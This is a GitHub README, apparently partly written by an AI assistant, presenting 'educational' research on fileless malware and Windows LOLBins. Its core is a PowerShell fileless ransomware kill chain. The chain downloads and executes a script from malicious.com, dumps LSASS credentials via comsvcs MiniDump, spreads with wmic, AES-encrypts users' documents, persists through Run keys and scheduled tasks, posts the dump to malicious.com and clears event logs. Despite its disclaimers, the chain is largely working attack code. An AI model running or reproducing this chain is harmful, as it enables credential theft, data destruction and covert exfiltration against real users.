

# NSFW: Fileless Polymorphic Hybrid Malware & LOLBins Research

**Repository:** `P1rat3R00t/NSFW`  
**Purpose:** Educational cybersecurity research into advanced threat techniques, focusing on fileless malware and Living-Off-the-Land Binaries (LOLBins).

---

## ⚠️ Legal & Ethical Notice

> **This repository is strictly for educational, academic, and controlled research lab use.**  
> **Never deploy or test these techniques on unauthorized or production systems. Misuse may violate laws, ethics, and professional standards.**

---

![Demo Screenshot](https://github.com/user-attachments/assets/f93a65bd-d000-41f0-a941-631f047417e4)

---

## 🧠 Overview: Fileless Malware & LOLBins

- **Fileless malware** operates entirely in memory, avoiding disk writes to evade detection by antivirus and EDR solutions.
- **LOLBins** (Living Off the Land Binaries) are legitimate Windows binaries abused by attackers for stealthy, malicious operations. Their trusted status makes detection more challenging.

---

## ⚙️ Common LOLBins and Abuse Patterns

| LOLBin                      | Abused For                | ATT&CK Tactics                   |
|-----------------------------|---------------------------|----------------------------------|
| `rundll32.exe`              | DLL execution             | Code execution, EDR bypass       |
| `mshta.exe`                 | Run HTA payloads          | Script execution, sandbox evasion|
| `regsvr32.exe`              | Load COM DLLs             | Fileless execution, C2 proxy     |
| `wmic.exe`                  | Remote command execution  | Process launch, lateral movement |
| `cmd.exe` / `powershell.exe`| Script runners            | Payload staging, persistence     |
| `msbuild.exe`               | Inline C# compile/exec    | Fileless malware loading         |
| `certutil.exe`              | Download/decode files     | Exfiltration, staging            |
| `bitsadmin.exe`             | Remote file fetch         | Delivery, task persistence       |
| `schtasks.exe`              | Task scheduling           | Privilege escalation, persistence|
| `esentutl.exe`              | Copy/exec payloads        | Stealth ops, exfiltration        |

---

## 🧬 Simulated Kill Chain: 100% Fileless Ransomware (Lab Example)

*Technique mapping via [MITRE ATT&CK](https://attack.mitre.org/)*

> **Disclaimer:** The following PowerShell sequence is a synthetic, safe example for red team development in a secure lab. **Never execute outside a controlled environment.**

<details>
<summary>🔐 Click to expand PowerShell Simulation Example</summary>

```powershell
# 🎯 Initial Access (T1190)
$payloadUrl = "http://malicious.com/dropper.ps1"
IEX(New-Object Net.WebClient).DownloadString($payloadUrl)

# ⚡ Execution (T1059.001)
$encPayload = "[Base64-Encoded Payload]"
$decodedPayload = [System.Convert]::FromBase64String($encPayload)
[System.Reflection.Assembly]::Load($decodedPayload)

# 🔓 Privilege Escalation (T1548)
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File C:\Windows\Temp\elevate.ps1" -Verb RunAs

# 🧪 Credential Access (T1003.001)
Invoke-Expression "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full"

# 🔍 Discovery (T1082)
$sysInfo = Get-WmiObject Win32_ComputerSystem | Select Manufacturer, Model, Name, Domain, UserName
$networkInfo = Get-NetAdapter | Select Name, MacAddress, Status
Write-Output $sysInfo; Write-Output $networkInfo

# 🌐 Lateral Movement (T1021.001)
cmd.exe /c "wmic /node:targetPC process call create 'powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1'"

# 💣 Impact: File Encryption (T1486)
$targetFiles = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.txt,*.docx,*.xls -Recurse
foreach ($file in $targetFiles) {
    $content = Get-Content $file.FullName -Raw
    $key = (1..32 | ForEach-Object { [char](Get-Random -Minimum 65 -Maximum 90) }) -join ''
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32, 'X'))
    $aes.IV = New-Object byte[] 16
    $encryptor = $aes.CreateEncryptor()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
    $encryptedContent = [Convert]::ToBase64String($encryptor.TransformFinalBlock($bytes, 0, $bytes.Length))
    Set-Content -Path $file.FullName -Value $encryptedContent
}

# 📌 Persistence (T1547.001)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousProcess" -Value "powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\persist.ps1"
schtasks /create /tn "MaliciousTask" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\persist.ps1" /sc onlogon /rl highest

# 📤 Exfiltration (T1041)
$exfilData = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\Temp\lsass.dmp"))
Invoke-WebRequest -Uri "http://malicious.com/exfil" -Method Post -Body $exfilData

# 🧹 Defense Evasion (T1070)
Remove-Item -Path C:\Windows\Temp\* -Force -Recurse
wevtutil cl System; wevtutil cl Security; wevtutil cl Application
cmd.exe /c "attrib +h +s C:\Windows\Temp\*"
```

</details>

---

## 🖥️ TeamViewer as a RAT: Summary

TeamViewer, a legitimate remote desktop tool, can be abused as a Remote Access Trojan (RAT) through weak configurations, credential theft, or exploitation of software vulnerabilities.

---

## 🚀 Getting Started

1. **Clone the repository:**
   ```bash
   git clone https://github.com/P1rat3R00t/NSFW.git
   cd NSFW
   ```
2. **Review all code and scripts before executing anything.**
3. **Set up a safe, isolated lab environment** (physical or virtual) before conducting any testing.

---

## 🤝 Contributing

Contributions for improving documentation, research, and detection techniques are welcome!  
Please open an issue or pull request.  
**Do not submit or request real malware samples.**

---

## 🧭 Additional Resources

- 🛠️ [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
- 🧬 [LOLGEN – Generate LOLBin Abuse Chains](https://lolgen.hdks.org/)
- 🔍 [MITRE ATT&CK: S0697](https://attack.mitre.org/software/S0697/)
- 💥 [PrintNightmare Technical Dive](https://itm4n.github.io/printnightmare-not-over/)
- 💀 [Print Spooler Exploit Overview](https://cybersparksdotblog.wordpress.com/2024/11/25/windows-print-spooler-eop-the-printnightmare-of-2021/)
- 🔗 [DLL Injection Reference](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
- 🦠 [Fileless Malware on Wikipedia](https://en.wikipedia.org/wiki/Fileless_malware)
- 🖨️ [Printer Driver Exploit Repo](https://github.com/jacob-baines/concealed_position)

---

## 🛡️ Final Note

This repository is for cybersecurity researchers, malware analysts, and red teamers.  
**Do not use for malicious purposes or outside legal boundaries. Always comply with your country’s laws and organizational policies.**



Let me know if you'd like further customization or want to add badges, contact info, or more usage details!
